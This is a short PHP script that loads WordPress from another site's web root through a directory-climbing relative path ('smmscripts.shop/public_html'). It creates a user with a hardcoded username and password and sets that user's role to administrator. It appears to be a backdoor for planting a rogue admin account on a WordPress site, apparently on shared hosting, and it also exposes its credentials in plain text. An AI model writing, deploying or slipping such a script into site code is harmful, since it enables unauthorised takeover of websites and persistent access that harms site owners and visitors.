<?php
require_once('../../../../smmscripts.shop/public_html/wp-load.php');

// New admin user details
$username = 'mohitpatani';
$password = 'Mohit@#5789544';
$email = 'your@gmail.com';

// Create the new user
$user_id = wp_create_user($username, $password, $email);

// Check if the user was created successfully
if (!is_wp_error($user_id)) {
    // Add the user to the administrator role
    $user = new WP_User($user_id);
    $user->set_role('administrator');

    echo 'Admin user created successfully.';
} else {
    echo 'Error creating admin user: ' . $user_id->get_error_message();
}